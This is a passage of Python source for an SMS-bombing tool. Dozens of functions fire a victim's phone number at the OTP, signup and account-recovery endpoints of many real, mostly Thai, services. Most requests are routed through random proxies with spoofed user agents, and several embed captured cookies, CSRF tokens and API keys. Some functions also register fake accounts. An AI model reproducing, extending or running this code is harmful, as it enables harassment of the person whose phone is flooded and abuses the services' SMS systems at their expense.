"_gcl_au=1.1.786653043.1666930228;_gid=GA1.3.2033124357.1666930228;_dc_gtm_UA-65843992-28=1;_ga=GA1.3.2050278932.1666930228;_gaexp=GAX1.3.wdMsU-TcQXeB5H9GO-G4Tw.19357.1!AoYo68DrQk-jlcseD-b4FQ.19330.2!mDL1fU8cRPmYzvHq-QSfqg.19330.2;_fbp=fb.2.1666930233269.696060227;_hjSessionUser_2738441=eyJpZCI6IjA3ODJhN2RlLTEyNGItNWFjNy05MmE3LTcwNWE0YTllNTJiMSIsImNyZWF0ZWQiOjE2NjY5MzAyMzI3NzIsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjSession_2738441=eyJpZCI6ImY1MzllZDk0LWJlMjQtNDM0ZS05OGY1LWI0ODZhM2MzYTBkMiIsImNyZWF0ZWQiOjE2NjY5MzAyMzMzNTMsImluU2FtcGxlIjp0cnVlfQ==;_hjAbsoluteSessionInProgress=1;cto_bundle=YVwhbF9hWWRuREsxRm5VZnFpWGVpM0FxdGNTZ201Y2s5REUyT2pxVVVqNGZiS2pQaG5meXN2SXVLMzBCJTJGS3BuNWV4WGklMkY0ZjQxT2tRQnQ1ZkRzU0NibTd3MGxNTFViSDRRR1BrU21vdm5YcyUyRm1Da0xWaXRXayUyRlpBYmV5MUlBMjNaUVJYMmVncnJOajUwa0t6ZndWJTJCcmMzYzBRJTNEJTNE;_ga_7VGYE5TTVG=GS1.1.1666930228.1.1.1666930253.35.0.0"})

def smsapi53(phone):
    requests.post("https://shopgenix.com/api/sms/otp/", headers={
            "Host": "shopgenix.com",
            "content-length": "37",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "accept": "application/json, text/javascript, /; q=0.01",
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty"
            }, data=f"mobile_country_id=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi54(phone):
    post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"},proxies={'http': 'http://' + random.choice(s)})

def smsapi55(phone):
    requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json

def smsapi56(phone):
  SEND  = ru.Session()
  API_WEB = SEND.get('https://app.khonde.com/register',headers={"User-Agent": generate_user_agent()}).text
  SEND_TOKEN = bs(API_WEB,'html.parser')
  TOKEN = SEND_TOKEN.find("meta",attrs={"name":"csrf-token"})
  r = SEND.get(f'https://app.khonde.com/requestOTP/{phone}',headers={"X-XSRF-TOKEN": TOKEN['content'],"User-Agent": generate_user_agent(),"Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE; _gat_gtag_UA_74972330_26=1; _fbp=fb.1.1657960248320.1708448457; _tt_enable_cookie=1; _ttp=da5ea560-0a16-4bc0-90d1-3ddd1fc73db4; XSRF-TOKEN=eyJpdiI6IisyMWw5ZnhaS2JXV3FmR3dyV0JGdVE9PSIsInZhbHVlIjoiQnNLQjh6dExTdmh5ZnJZeHNjNkkzd3dMMHpXV1dZV2hROXYyV0NMSnZpOWdQeFdqRU9RQ3Y4M2Y1aXk5Y1QvcFM1V2N0MG9oRUkxQUU3TlFESDlVU21Qa2JMMmxqRHBISFRsOXZGaFVMVGY0ZW1idysrWUVlNTFQWDYvQ1NSWFgiLCJtYWMiOiI1ODRiNTRmOGJkMzRjMzE1YmUxMmQ2Y2NkZWRhOGQ5ZDkwM2MxYWNjMmVmOTk2MzE4MmYzYmQ3ZWFiYWQ1ZjBlIn0%3D; khonde_session=eyJpdiI6IlMyNmpkRWl4NTh1emFLRWNiL0k2ZlE9PSIsInZhbHVlIjoiSEUzNGNnMVFwNGxJNTZVNmVzMWtrQk82NDZ0eGM1ckxrK3VVS1BWZ1NOMDlmbWl5RXdpa2dDMzQrdzIvMkRZeFpwa2dGamdGcFYwcVZWVjhFSjg2elZ1OUFxTWhuV3hIZlV2cFVIVW9VMnBCUEIxVUV6MVp1Y3JPb3JBOXFZeCsiLCJtYWMiOiJiYzM2ZDVhOWFiOTY3NTAyN2RhYTI1NWYwYjZhY2RmYTgxNWRmOGJkOWJhYjcyMGVhYzU0MjE4NGYxYjdlMTU4In0%3D; _ga_X6J1S6LV1V=GS1.1.1657960251.1.0.1657960251.60; _ga=GA1.1.1429094721.1657960248"},proxies={'http': 'http://' + random.choice(s)})

def smsapi57(phone):
    requests.post("https://gamingnation.dtac.co.th/api/otp/request",headers={"User-Agent": generate_user_agent(),"Cookie": "auth.strategy=local; i18n_redirected=th; _gcl_au=1.1.265124296.1661273714; _ga=GA1.3.1857579863.1661273717; _gid=GA1.3.1514915490.1661273717; _fbp=fb.2.1661273718125.787639535; _tt_enable_cookie=1; _ttp=7e4a2162-1ab4-41a0-8b77-e1188cda6a3a; _hjSessionUser_2510409=eyJpZCI6ImVkM2I0OWU2LTBjODQtNWU1ZC04OWIzLTZlMjk5NGFhMWE3NCIsImNyZWF0ZWQiOjE2NjEyNzM3MTc5MzcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjA4YjEyYTNlLTExNjgtNDNlMS05NTVmLWMyMWY2OTU5MGFiYyIsImNyZWF0ZWQiOjE2NjEyNzM3MTgzMTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _gat_UA-16732483-1=1"},json={"template":"register","phone_no":phone},proxies={'http': 'http://' + random.choice(s)})

def smsapi58(phone):
    requests.get(f"https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66{phone[1:]}",headers={"authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})

def smsapi59(phone):
    get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",proxies={'http': 'http://' + random.choice(s)})

def smsapi60(phone):
    requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})

def smsapi61(phone):
    requests.post("https://pgbetflik.com/account/register/sendotp",data=f"phone={phone}",headers={"content-type: application/x-www-form-urlencoded; charset=UTF-8","requested-with: XMLHttpRequest","user-agent: Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})

def smsapi62(phone):
    requests.post("https://graph.firster.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/json"},json={"operationName":"sendOtp","variables":{"input":{"mobileNumber":f"{phone[1:]}","phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})

def smsapi63(phone):
    requests.post("https://api.best-inc.co.th/account/sendlogincode",headers={"content-type": "application/x-www-form-urlencoded","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},data=f"phoneNumber=%22{phone}%22",proxies={'http': 'http://' + random.choice(s)})

def smsapi64(phone):
    requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},proxies={'http': 'http://' + random.choice(s)})

def smsapi65(phone):
    requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})

def smsapi66(phone):
    post("https://ezregis01.com/_ajax_/register/request-otp",json={"phoneNumber":f"{phone}","affSign":"e1af462f54b57749cb61e4ac010fd0ee"},proxies={'http': 'http://' + random.choice(s)})

def smsapi67(phone):
    ru.post("https://www.tgfone.com/signin/otp_chk_fast",
    headers= {
                "accept": "text/html, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://www.tgfone.com",
                "referer": "https://www.tgfone.com/login"
                },data=f"mobile={phone}&type_otp=7",proxies={'http': 'http://' + random.choice(s)})

def smsapi68(phone):
    post("https://www.beauticool.com/?m=request_otp",headers={
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"x-requested-with": "XMLHttpRequest",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://www.beauticool.com",
"referer": "https://www.beauticool.com/m/signup_tel.php",
"cookie": "PHPSESSID=udogc4sigrtvi4lvkll4g62gp3",
"cookie": "_ga=GA1.1.1703943258.1663615884",
"cookie": "trustedsite_visit=1",
"cookie": "_ga_PZZ327LRJ2=GS1.1.1663615884.1.1.1663615918.0.0.0"
    },data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi69(phone):
    post("https://aff.ufaclub24.org/pin.php",headers={
                "origin": "https://aff.ufaclub24.org",
                 "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer": "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7",
                "cookie": "PHPSESSID=n6da80gl0j6u7ob1ltlseb5m6p;_ga=GA1.2.18658305.1649308092;_gid=GA1.2.1210153607.1649308092;_gat_gtag_UA_155192447_2=1"
                },data=f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi70(phone):
    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0},proxies ={"http" : "http://" + random.choice(proxy)})

def smsapi71(phone):
    post("https://www.kaitorasap.co.th/api/index.php/send-otp-login-new/",headers={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With": "XMLHttpRequest",
"sec-ch-ua-mobile": "?1",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"},data=f"phone_number={phone}&lag=",proxies ={"http" : "http://" + random.choice(proxy)})

def smsapi72(phone):
    post("https://api-next-version.freshket.co/baseApi/Users/RequestOtp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"content-type": "application/json;charset=UTF-8",
"accept": "application/json, text/plain, */*",
"x-guest": "Julian"},json={"isDev":"false","language":"th","phone":f"+66{phone}"},proxies={'http': 'http://' + random.choice(s)})

def smsapi73(phone):
    post(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})

def smsapi74(phone):
    post("https://mapi.konglor888.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"konglor888.com"},proxies={'http': 'http://' + random.choice(s)})

def smsapi75(phone):
    post("https://mapi.hit789.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"hit789.com"},proxies={'http': 'http://' + random.choice(s)})

def smsapi76(phone):
    token,cid=ig_token()
    post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",
proxies ={"http" : "http://" + random.choice(proxy)},data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()

def smsapi77(phone):
    post("https://biogamin1-api.win.game/api/v3/otp/send",headers={
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json",
    "authorization": "Basic a7af349d858e91c6b96426a64148dc41b8de4e2b808537fb1f98556379769ff62d5295bb4d0e1302a91629744cad45d6d175c7752fec4b777536c160137b0c32",
     "sec-ch-ua-mobile": "?1",
     "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
     "sec-ch-ua-platform": "Android",
     "origin": "https://wallet.biogaming1.com",
     "sec-fetch-site": "cross-site",
     "sec-fetch-mode": "cors",
     "sec-fetch-dest": "empty",
     "referer": "https://wallet.biogaming1.com/"
    },json={"tel":f"{phone}","otp_type":"register"},proxies={'http': 'http://' + random.choice(s)})

def smsapi78(phone):
    post("https://gateway-sport.apija.tech/iamrobot/frontend/user/send-otp",headers={
    "accept": "application/json",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "Android",
    "origin": "https://sport.playauto.cloud",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://sport.playauto.cloud/"
    },json={"tel":f"{phone}","prefix":"KDA"},proxies={'http': 'http://' + random.choice(s)})

def smsapi79(phone):
    post("https://member.ufabet191.tv/api/auth/register-request-otp/",headers={
    "Host": "member.ufabet191.tv",
    "content-length": "62",
    "content-type": "application/x-www-form-urlencoded",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "Android",
    "accept": "*/*",
    "origin": "https://member.ufabet191.tv",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://member.ufabet191.tv/auth/register",
    "cookie": "_ga=GA1.2.33421619.1662160579",
    "cookie": "_gid=GA1.2.1771765964.1662160579",
    "cookie": "_gat_gtag_UA_158659719_10=1",
    "cookie": "XSRF-TOKEN=eyJpdiI6IndhdW5qNE1ZT1ZNQXJWaUpuLzUwVFE9PSIsInZhbHVlIjoiQk9PZFhxanMrM1pMblIzdEhFc0lSNFJLTkNLZjVyUWNpQkpTV0V6L05OakxtU2xzTk12YUpvSHczQ2d6aTFzcTRXcG05TWM2a3NWUTMxWXJVVXZoR29WT2g0d1JGUEl4YUdOMVQwVVVzNTFuWEh1eDhVOTRDbmE0Zm1qcFhDTmkiLCJtYWMiOiI3ZmQ3MzdhM2MyNTRjNzQ5YWQzZmEyNTJlMjM5Y2M3YjhlYjkzYzgwN2FlY2Y0Y2VjMzhlZTJkODJlNTBkY2E2IiwidGFnIjoiIn0%3D",
    "cookie": "ufabet191tv_session=eyJpdiI6Ijd4Ui83Q2I3aldocUU5NTJ5dFo4WUE9PSIsInZhbHVlIjoiaytmT2V0Zlk2WWk4QU0rMUpUMWdJZ2Zwc3hsSnVzZVNYTVoxYytYaGNwQlBRcUEwOWU1MStreE80NktiOExMczhJR2VPZHV1VklVUmVJdDlQUU1vTjc5cXpBN1pPK2hHeUlsVWIxcGlWRkdISzVuTE5vSnFrdkJqVklYNzJiUDMiLCJtYWMiOiI2N2Y4YWRlZTcxYjhjZjlkYTI2NzhiMmNkMjkwYTQzNDY3ZmFkYjM1MjZmNmFiMTRlYTdkOTg3ZDU1OWRmYmFhIiwidGFnIjoiIn0%3D"},
    data=f"tel={phone}&_token=Y8NI28Fne5GUrBncQbzPrOb0nOftBiqEa8Cf4rEp",proxies={'http': 'http://' + random.choice(s)})

def smsapi80(phone):
    post("https://api-sso.ch3plus.com/user/request-otp",headers={
  "Host": "api-sso.ch3plus.com",
    "content-length": "35",
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "Android",
    "origin": "https://accounts.ch3plus.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://accounts.ch3plus.com/"},
    json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})


def smsapi81(phone):
  post("https://api.salehere.co.th/graphql",headers={
 "content-type": "application/json",
"accept": "*/*",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://salehere.co.th",
"referer": "https://salehere.co.th/",
"cookie": "_fbp=fb.2.1663532271733.671668678",
"cookie": "_ga=GA1.3.1446059210.1663532277",
"cookie": "_gid=GA1.3.891158475.1663532277",
"cookie": "_gat_UA-118968627-9=1",
"cookie": "_ga_TQ163J47DR=GS1.1.1663532276.1.0.1663532277.0.0.0",
"cookie": "__utma=195884718.1446059210.1663532277.1663532278.1663532278.1",
"cookie": "__utmc=195884718",
"cookie": "__utmt_%5Bobject%20Object%5D=1",
"cookie": "G_ENABLED_IDPS=google",
"cookie": "__utmb=195884718.2.10.1663532278"
    },json={"operationName":"sendUserOTPV2","variables":{"tel":f"{phone}","token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}},proxies={'http': 'http://' + random.choice(s)})

def smsapi82(phone):
  post("https://api.best-inc.co.th/account/sendlogincode",headers={
"content-type": "application/x-www-form-urlencoded",
"accept": "application/json",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"x-lan": "EN",
"sec-ch-ua-platform": "Android",
"Origin": "https://www.best-inc.co.th",
"Referer": "https://www.best-inc.co.th/"
    },data=f"phoneNumber=%22{phone}%22",proxies={'http': 'http://' + random.choice(s)})

def smsapi83(phone):
    post("https://u.icq.net/api/v4/rapi",headers={
"content-type": "application/json",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"},json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},proxies={'http': 'http://' + random.choice(s)})

def smsapi84(phone):
    post("https://app.droprich.co/agent/registergetsmsotp",headers={
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
   },data=f"phonenumber={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi85(phone):
    post("https://aws-autobet168.api-ufa.com/transfer/f/user/request-otp",headers={
  "Host": "aws-autobet168.api-ufa.com",
"content-length": "45",
"accept": "application/json, text/plain, */*",
"content-type": "application/json",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://mob-wallet.autoeasy.io",
"sec-fetch-site": "cross-site",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://mob-wallet.autoeasy.io/"
    },
    json={"phoneNumber":f"{phone}","prefix":"F2R41"},proxies={'http': 'http://' + random.choice(s)})

def smsapi86(phone):
    post("https://api.sbobet.one/api/RegisterService/RequestOTP",headers={
"Host": "api.sbobet.one",
"content-length": "22",
"accept": "application/json, text/plain, */*",
"content-type": "application/json",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://app.sbobet.one",
"sec-fetch-site": "same-site",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://app.sbobet.one/"
    },
    json={"Phone":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})

def smsapi87(phone):
    post("https://pgzeed.org/api/otp",headers={
  "content-type": "application/json",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://pgzeed.org",
"referer": "https://pgzeed.org/?campGame=SLOT&s_=59",

"cookie": "auth.strategy=local"
  },
  json={"phone_number":f"{phone}","register_type":""},proxies={'http': 'http://' + random.choice(s)})

def smsapi88(phone):
    post("https://referral.huaynaka.com/v1/sendotp",headers={
"content-type": "application/json;charset=UTF-8",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"x-api-key": "Prmx2j2mZaaKwCR4jDyki9VANcKqF3565owwHgDE",
"sec-ch-ua-platform": "Android",
"origin": "https://tang.huaynaka.com",
"referer": "https://tang.huaynaka.com/"
    },
    json={"phone":f"+66{phone}"},proxies={'http': 'http://' + random.choice(s)})

def smsapi89(phone):
    post("https://th.openrice.com/api/v1/auth/signup/phone?uiLang=th&uiCity=bangkokr",headers={
    "content-type": "application/x-www-form-urlencoded",
    "accept": "*/*",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "Android"},data=f"areaCode=6&phone={phone}&regionId=400",proxies={'http': 'http://' + random.choice(s)})

def smsapi90(phone):
    requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}")

def smsapi91(phone):
    headers = {"accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
    requests.post("https://api.ypkshop.com/TOH5jkk3N031INbUepb-2SZCYIj5XGQr_xd-aSSd74s~",headers=headers,data=f"prefix=66&mobile={phone}&type=1")    

def smsapi92(phone):
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":phone,"provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})

def smsapi93(phone):
    requests.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": phone,"language": "th"})

def smsapi94(phone):
    requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": phone,"language": "th"})

def smsapi95(phone):
    headers = {
    "Host": "shopgenix.com",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "okhttp/3.14.9"
  }
    requests.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={phone}")

def smsapi96(phone):
    requests.post("https://api.starzth.com/homeshopping/v2/register/request",headers=headers,json={"username":phone,"name_th":"jsjss","lastname_th":"nxnxnx","password":"as257400A","birthday":"1982-08-08","sex":"M","telephone":f"+66{phone[1:]}"})

def smsapi97(phone):
    requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"})

def smsapi98(phone):
